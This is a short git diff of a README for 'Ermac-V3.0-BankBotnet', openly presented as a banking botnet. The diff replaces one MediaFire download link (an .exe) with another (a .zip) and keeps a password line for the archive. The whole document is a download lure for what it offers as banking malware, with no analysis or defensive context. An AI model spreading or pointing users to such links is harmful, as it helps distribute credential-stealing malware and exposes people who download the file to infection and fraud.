@@ -1,6 +1,6 @@
 # Ermac-V3.0-BankBotnet
 
-[Click Here To Download](https://www.mediafire.com/file/0xc7r90ecpzdi2n/Ermac3.0.exe/file)
+[Click Here To Download](https://www.mediafire.com/file/ceyvcm4yx7vrhkc/Ermac+3.0.zip/file)
 [Pass : S3rv3r%.]
 
 
